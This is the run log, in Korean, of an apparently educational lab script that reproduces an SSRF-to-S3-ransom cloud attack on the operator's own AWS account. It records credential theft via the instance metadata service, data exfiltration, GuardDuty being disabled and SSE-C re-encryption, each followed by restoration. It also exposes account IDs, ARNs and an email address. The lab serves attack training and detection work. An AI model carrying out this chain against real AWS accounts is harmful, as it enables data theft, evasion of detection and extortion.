[10:22:10] WARNING [원상복구]  python scenario1.py --restore
[10:22:10] WARNING   객체 평문화 + SSE-C 차단 복원 + GuardDuty 재활성화 을 한 번에 수행한다.
[10:22:21] INFO  ================================================================
[10:22:21] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[10:22:21] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[10:22:21] INFO  ================================================================
[10:22:40] INFO  ================================================================
[10:22:40] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[10:22:40] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[10:22:40] INFO  ================================================================
[10:22:40] INFO  [restore] 복구 전용 자격증명 — Arn=arn:aws:iam::896986966760:user/whs_whsjis1018
[10:22:40] INFO  ================================================================
[10:22:40] INFO    RESTORE — SSE-C 재암호화 원상복구
[10:22:40] INFO  ================================================================
[10:22:40] INFO    [+] 저장된 SSE-C 키 로드: recovery/ssec.key
[10:22:40] INFO    [+] 암호화 기록에서 대상 3개 확인
[10:22:41] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[10:22:41] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[10:22:41] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[10:22:41] INFO    [=] 복구 3개 / 실패 0개
[10:22:41] INFO    [+] 버킷 암호화 설정 원복 완료 (SSE-C 차단 복원)
[10:22:42] INFO    [+] GuardDuty 재활성화 완료 — Status=ENABLED
[10:22:42] INFO  ================================================================
[10:22:42] INFO    SCENARIO 1 복구 종료
[10:22:42] INFO    로그: scenario1/scenario1.log
[10:22:42] INFO  ================================================================
[10:44:03] INFO  ================================================================
[10:44:03] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[10:44:03] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[10:44:03] INFO  ================================================================
[10:44:04] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[10:44:04] INFO  ================================================================
[10:44:04] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[10:44:04] INFO  ================================================================
[10:44:04] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[10:44:04] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[10:44:04] INFO        Expiration=2026-09-30T07:32:30Z
[10:44:04] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-01f92ed077d78a1a3
[10:44:04] INFO  ================================================================
[10:44:04] INFO    STEP 3 — 정찰(T1580): S3/STS/IAM 리소스 열거
[10:44:04] INFO  ================================================================
[10:44:05] INFO    [+] sts:GetCallerIdentity Arn=arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-0c5e1470f80d20f8c
[10:44:05] INFO    [+] s3:ListAllMyBuckets — 15개
[10:44:05] INFO        - cloud9-attack-profile-a396cc5b
[10:44:05] INFO        - cloud9-attack-target-a396cc5b
[10:44:05] INFO        - cloud9-security-896986966760-ap-northeast-2-cloudtrail
[10:44:05] INFO        - cloud9-security-normalized-logs-896986966760-ap-northeast-2-an
[10:44:05] INFO        - cloud943-attack-tfstate
[10:44:05] INFO        - hitl-dashboard-reports-5c7d05592bb4b3dfddcf6026b8
[10:44:05] INFO        - whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an
[10:44:05] INFO        - whs-elk-s3-artifacts-896986966760-ap-northeast-2
[10:44:05] INFO        - whs-elk-s3-investigation-results-896986966760-ap-northeast-2
[10:44:05] INFO        - whs-elk-s3-raw-896986966760-ap-northeast-2
[10:44:05] INFO        - whs-elk-s3-snapshots-896986966760-ap-northeast-2
[10:44:05] INFO        - whs-ir-test-cloudtrail-20260924
[10:44:05] INFO        - whs-ir-test-target-20260924
[10:44:05] INFO        - whs-ssrf-tfstate-896986966760
[10:44:05] INFO        - whs-weekly-report-bucket
[10:44:06] INFO    [expected] iam:ListUsers → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[10:44:06] INFO  ================================================================
[10:44:06] INFO    STEP 4 — S3 데이터 수집·유출(T1530/T1537)
[10:44:06] INFO  ================================================================
[10:44:07] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv (3292 bytes) → exfiltrated/customers.csv
[10:44:07] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json (155 bytes) → exfiltrated/config.json
[10:44:07] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt (48 bytes) → exfiltrated/flag.txt
[10:44:07] INFO    [=] 유출 3/3 파일
[10:44:07] INFO  ================================================================
[10:44:07] INFO    STEP 5 — 장기 자격증명(AKIA) 확보
[10:44:07] INFO  ================================================================
[10:44:07] INFO    [+] config.json 탈취 — 내부 장기 자격증명(더미) AccessKeyId=AKIAFA…(20자)
[10:44:07] INFO    [+] 장기 자격증명 확보: AccessKeyId=AKIA5B…(20자)
[10:44:07] INFO        → 임시키 만료(역할 최대 세션 1시간) 후에도 접근이 유지되는 지속성 확보
[10:44:07] INFO        → 이후 6·7 은 이 키로 실행 — CloudTrail 에 principal 이 바뀌어 찍힌다
[10:44:08] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[10:44:08] INFO  ================================================================
[10:44:08] INFO    STEP 6 — GuardDuty 비활성화(T1562.008)
[10:44:08] INFO  ================================================================
[10:44:08] INFO    [+] 변경 전 상태 저장: recovery/guardduty_before.json (before=ENABLED)
[10:44:08] WARNING   [!] detector=2daa4601845647bc8ea3e66f821d8401 를 Enable=False 로 전환 시도
[10:44:08] WARNING   [+] GuardDuty 비활성화 성공 — 탐지가 실제로 멈췄다.
[10:44:08] WARNING       복구(필수): aws guardduty update-detector --detector-id 2daa4601845647bc8ea3e66f821d8401 --enable --region ap-northeast-2
[10:44:08] INFO  ================================================================
[10:44:08] INFO    STEP 7 — SSE-C 재암호화 랜섬(T1486)
[10:44:08] INFO  ================================================================
[10:44:09] INFO    [+] 버킷 버저닝 상태 = Disabled
[10:44:09] WARNING   [!] 버저닝 미활성 — 이전 버전 롤백 경로가 없다.
[10:44:09] WARNING       복구는 recovery/ssec.key 에 전적으로 의존한다. 이 파일을 잃지 말 것.
[10:44:09] INFO    [+] 재암호화 대상 3개 (s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/)
[10:44:09] INFO        - whs-data/config.json
[10:44:09] INFO        - whs-data/customers.csv
[10:44:09] INFO        - whs-data/flag.txt
[10:44:09] INFO    [+] SSE-C 키 확보(os.urandom(32) 신규 생성) 및 로컬 저장·검증 완료
[10:44:09] INFO        키 파일 : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key
[10:44:09] INFO        메타    : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key.meta.json (대상 목록·복구 명령 포함)
[10:44:09] INFO        복구    : python scenario1.py --restore
[10:44:09] INFO    [+] 현재 차단된 암호화 유형 = ['SSE-C']
[10:44:09] INFO        변경 전 설정 저장: recovery/bucket_encryption_before.json
[10:44:09] WARNING   [!] SSE-C 차단 해제 시도 (T1562.001) — 버킷 보안 설정 변경
[10:44:09] WARNING   [+] SSE-C 차단 해제 확인됨 — 실습 후 원복 필요(--restore)
[10:44:09] WARNING   [!] 재암호화 시작 — 이후 이 객체들은 키 없이 읽을 수 없다.
[10:44:09] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[10:44:09] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[10:44:09] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[10:44:09] INFO    [=] 재암호화 3개 / 차단 0개
[10:44:09] WARNING       복구: python scenario1.py --restore  (키: recovery/ssec.key)
[10:44:09] INFO  ================================================================
[10:44:09] INFO    SCENARIO 1 종료
[10:44:09] INFO    로그: scenario1/scenario1.log
[10:44:09] INFO  ================================================================
[10:44:09] WARNING 
[10:44:09] WARNING [원상복구]  python scenario1.py --restore
[10:44:09] WARNING   객체 평문화 + SSE-C 차단 복원 + GuardDuty 재활성화 을 한 번에 수행한다.
[10:44:10] INFO  ================================================================
[10:44:10] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[10:44:10] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[10:44:10] INFO  ================================================================
[10:44:10] ERROR [!] 이전 실행이 아직 복구되지 않았다:
[10:44:10] ERROR       - SSE-C 로 잠긴 S3 객체가 남아 있다  (recovery/encrypted_objects.json)
[10:44:10] ERROR       - 버킷 SSE-C 차단이 풀린 채다  (recovery/bucket_encryption_before.json)
[10:44:10] ERROR       - GuardDuty 가 꺼진 채일 수 있다  (recovery/guardduty_before.json)
[10:44:10] ERROR     먼저 복구를 끝내고 다시 실행할 것:  python scenario1.py --restore
[10:44:20] INFO  ================================================================
[10:44:20] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[10:44:20] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[10:44:20] INFO  ================================================================
[10:44:22] INFO  [restore] 복구 전용 자격증명 — Arn=arn:aws:iam::896986966760:user/whs_whsjis1018
[10:44:22] INFO  ================================================================
[10:44:22] INFO    RESTORE — SSE-C 재암호화 원상복구
[10:44:22] INFO  ================================================================
[10:44:22] INFO    [+] 저장된 SSE-C 키 로드: recovery/ssec.key
[10:44:22] INFO    [+] 암호화 기록에서 대상 3개 확인
[10:44:22] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[10:44:22] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[10:44:22] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[10:44:22] INFO    [=] 복구 3개 / 실패 0개
[10:44:23] INFO    [+] 버킷 암호화 설정 원복 완료 (SSE-C 차단 복원)
[10:44:24] INFO    [+] GuardDuty 재활성화 완료 — Status=ENABLED
[10:44:24] INFO  ================================================================
[10:44:24] INFO    SCENARIO 1 복구 종료
[10:44:24] INFO    로그: scenario1/scenario1.log
[10:44:24] INFO  ================================================================
[10:44:24] INFO  ================================================================
[10:44:24] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[10:44:24] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[10:44:24] INFO  ================================================================
[10:44:25] INFO  [restore] 복구 전용 자격증명 — Arn=arn:aws:iam::896986966760:user/whs_whsjis1018
[10:44:25] INFO  ================================================================
[10:44:25] INFO    RESTORE — SSE-C 재암호화 원상복구
[10:44:25] INFO  ================================================================
[10:44:25] INFO    [+] 저장된 SSE-C 키 로드: recovery/ssec.key
[10:44:25] INFO    [+] 암호화 기록에서 대상 0개 확인
[10:44:25] INFO    [=] 복구 0개 / 실패 0개
[10:44:25] INFO    [i] 암호화 설정 변경 기록 없음 — 복원 생략
[10:44:25] INFO    [i] GuardDuty 변경 기록 없음 — 복원 생략
[10:44:25] INFO  ================================================================
[10:44:25] INFO    SCENARIO 1 복구 종료
[10:44:25] INFO    로그: scenario1/scenario1.log
[10:44:25] INFO  ================================================================
[10:44:37] INFO  ================================================================
[10:44:37] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[10:44:37] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[10:44:37] INFO  ================================================================
[10:44:38] INFO  [auth] 정상 로그인 성공 — user=jeonis1018@gmail.com (13d0d481-afb9-4c4a-a986-c2c69ce19bf4)
[10:44:38] INFO  ================================================================
[10:44:38] INFO    STEP 1 — SSRF(T1190) → 임시 자격증명 탈취
[10:44:38] INFO  ================================================================
[10:44:38] INFO    [+] SSRF 로 IMDS 도달. EC2 role = cloud9-infra-attack-ec2-role
[10:44:38] INFO    [+] 임시 자격증명 탈취(ASIA…): AccessKeyId=ASIA5BWE…(20자)
[10:44:38] INFO        Expiration=2026-09-30T07:32:30Z
[10:44:38] INFO    [+] instance-identity: account=896986966760 region=ap-northeast-2 instance=i-01f92ed077d78a1a3
[10:44:38] INFO  ================================================================
[10:44:38] INFO    STEP 3 — 정찰(T1580): S3/STS/IAM 리소스 열거
[10:44:38] INFO  ================================================================
[10:44:39] INFO    [+] sts:GetCallerIdentity Arn=arn:aws:sts::896986966760:assumed-role/cloud9-infra-attack-ec2-role/i-0c5e1470f80d20f8c
[10:44:39] INFO    [+] s3:ListAllMyBuckets — 15개
[10:44:39] INFO        - cloud9-attack-profile-a396cc5b
[10:44:39] INFO        - cloud9-attack-target-a396cc5b
[10:44:39] INFO        - cloud9-security-896986966760-ap-northeast-2-cloudtrail
[10:44:39] INFO        - cloud9-security-normalized-logs-896986966760-ap-northeast-2-an
[10:44:39] INFO        - cloud943-attack-tfstate
[10:44:39] INFO        - hitl-dashboard-reports-5c7d05592bb4b3dfddcf6026b8
[10:44:39] INFO        - whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an
[10:44:39] INFO        - whs-elk-s3-artifacts-896986966760-ap-northeast-2
[10:44:39] INFO        - whs-elk-s3-investigation-results-896986966760-ap-northeast-2
[10:44:39] INFO        - whs-elk-s3-raw-896986966760-ap-northeast-2
[10:44:39] INFO        - whs-elk-s3-snapshots-896986966760-ap-northeast-2
[10:44:39] INFO        - whs-ir-test-cloudtrail-20260924
[10:44:39] INFO        - whs-ir-test-target-20260924
[10:44:39] INFO        - whs-ssrf-tfstate-896986966760
[10:44:39] INFO        - whs-weekly-report-bucket
[10:44:40] INFO    [expected] iam:ListUsers → AccessDenied (예상된 차단 — CloudTrail 증거 확보)
[10:44:40] INFO  ================================================================
[10:44:40] INFO    STEP 4 — S3 데이터 수집·유출(T1530/T1537)
[10:44:40] INFO  ================================================================
[10:44:41] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv (3292 bytes) → exfiltrated/customers.csv
[10:44:41] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json (155 bytes) → exfiltrated/config.json
[10:44:41] INFO    [+] 유출: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt (48 bytes) → exfiltrated/flag.txt
[10:44:41] INFO    [=] 유출 3/3 파일
[10:44:41] INFO  ================================================================
[10:44:41] INFO    STEP 5 — 장기 자격증명(AKIA) 확보
[10:44:41] INFO  ================================================================
[10:44:41] INFO    [+] config.json 탈취 — 내부 장기 자격증명(더미) AccessKeyId=AKIAFA…(20자)
[10:44:41] INFO    [+] 장기 자격증명 확보: AccessKeyId=AKIA5B…(20자)
[10:44:41] INFO        → 임시키 만료(역할 최대 세션 1시간) 후에도 접근이 유지되는 지속성 확보
[10:44:41] INFO        → 이후 6·7 은 이 키로 실행 — CloudTrail 에 principal 이 바뀌어 찍힌다
[10:44:42] INFO    [+] 자격증명 전환 완료 — Arn=arn:aws:iam::896986966760:user/WHS-Scenario-Persistence-User
[10:44:42] INFO  ================================================================
[10:44:42] INFO    STEP 6 — GuardDuty 비활성화(T1562.008)
[10:44:42] INFO  ================================================================
[10:44:42] INFO    [+] 변경 전 상태 저장: recovery/guardduty_before.json (before=ENABLED)
[10:44:42] WARNING   [!] detector=2daa4601845647bc8ea3e66f821d8401 를 Enable=False 로 전환 시도
[10:44:43] WARNING   [+] GuardDuty 비활성화 성공 — 탐지가 실제로 멈췄다.
[10:44:43] WARNING       복구(필수): aws guardduty update-detector --detector-id 2daa4601845647bc8ea3e66f821d8401 --enable --region ap-northeast-2
[10:44:43] INFO  ================================================================
[10:44:43] INFO    STEP 7 — SSE-C 재암호화 랜섬(T1486)
[10:44:43] INFO  ================================================================
[10:44:43] INFO    [+] 버킷 버저닝 상태 = Disabled
[10:44:43] WARNING   [!] 버저닝 미활성 — 이전 버전 롤백 경로가 없다.
[10:44:43] WARNING       복구는 recovery/ssec.key 에 전적으로 의존한다. 이 파일을 잃지 말 것.
[10:44:43] INFO    [+] 재암호화 대상 3개 (s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/)
[10:44:43] INFO        - whs-data/config.json
[10:44:43] INFO        - whs-data/customers.csv
[10:44:43] INFO        - whs-data/flag.txt
[10:44:43] INFO    [+] SSE-C 키 확보(os.urandom(32) 신규 생성) 및 로컬 저장·검증 완료
[10:44:43] INFO        키 파일 : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key
[10:44:43] INFO        메타    : C:\Users\user\cloud9_infra_attack\attack\scenario1\recovery\ssec.key.meta.json (대상 목록·복구 명령 포함)
[10:44:43] INFO        복구    : python scenario1.py --restore
[10:44:43] INFO    [+] 현재 차단된 암호화 유형 = ['SSE-C']
[10:44:43] INFO        변경 전 설정 저장: recovery/bucket_encryption_before.json
[10:44:43] WARNING   [!] SSE-C 차단 해제 시도 (T1562.001) — 버킷 보안 설정 변경
[10:44:43] WARNING   [+] SSE-C 차단 해제 확인됨 — 실습 후 원복 필요(--restore)
[10:44:43] WARNING   [!] 재암호화 시작 — 이후 이 객체들은 키 없이 읽을 수 없다.
[10:44:43] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[10:44:44] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[10:44:44] INFO    [+] 재암호화 완료: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[10:44:44] INFO    [=] 재암호화 3개 / 차단 0개
[10:44:44] WARNING       복구: python scenario1.py --restore  (키: recovery/ssec.key)
[10:44:44] INFO  ================================================================
[10:44:44] INFO    SCENARIO 1 종료
[10:44:44] INFO    로그: scenario1/scenario1.log
[10:44:44] INFO  ================================================================
[10:44:44] WARNING 
[10:44:44] WARNING [원상복구]  python scenario1.py --restore
[10:44:44] WARNING   객체 평문화 + SSE-C 차단 복원 + GuardDuty 재활성화 을 한 번에 수행한다.
[10:44:44] INFO  ================================================================
[10:44:44] INFO    SCENARIO 1 — SSRF → 자격증명 탈취 → S3 랜섬
[10:44:44] INFO    Capital One 2019 / Codefinger 2025 재현 (WHS 실습)
[10:44:44] INFO  ================================================================
[10:44:45] INFO  [restore] 복구 전용 자격증명 — Arn=arn:aws:iam::896986966760:user/whs_whsjis1018
[10:44:45] INFO  ================================================================
[10:44:45] INFO    RESTORE — SSE-C 재암호화 원상복구
[10:44:45] INFO  ================================================================
[10:44:45] INFO    [+] 저장된 SSE-C 키 로드: recovery/ssec.key
[10:44:45] INFO    [+] 암호화 기록에서 대상 3개 확인
[10:44:46] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/config.json
[10:44:46] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/customers.csv
[10:44:46] INFO    [+] 평문 복구: s3://whs-cloud9-vuln-web-lab-896986966760-ap-northeast-2-an/whs-data/flag.txt
[10:44:46] INFO    [=] 복구 3개 / 실패 0개
[10:44:46] INFO    [+] 버킷 암호화 설정 원복 완료 (SSE-C 차단 복원)
[10:44:47] INFO    [+] GuardDuty 재활성화 완료 — Status=ENABLED
[10:44:47] INFO  ================================================================
[10:44:47] INFO    SCENARIO 1 복구 종료
[10:44:47] INFO    로그: scenario1/scenario1.log
[10:44:47] INFO  ================================================================
